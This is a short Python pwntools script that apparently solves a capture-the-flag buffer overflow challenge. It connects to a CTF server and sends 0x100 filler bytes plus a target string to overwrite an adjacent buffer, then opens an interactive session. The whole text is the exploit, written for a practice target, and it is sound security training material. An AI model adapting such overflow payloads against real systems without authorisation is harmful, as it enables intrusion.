from pwn import *

r=remote("chals20.cybercastors.com",14424)
#r=process("./abcbof")

pay=""
pay+='x'*0x100
pay+="CyberCastors"+'\x00'

r.sendline(pay)

r.interactive()
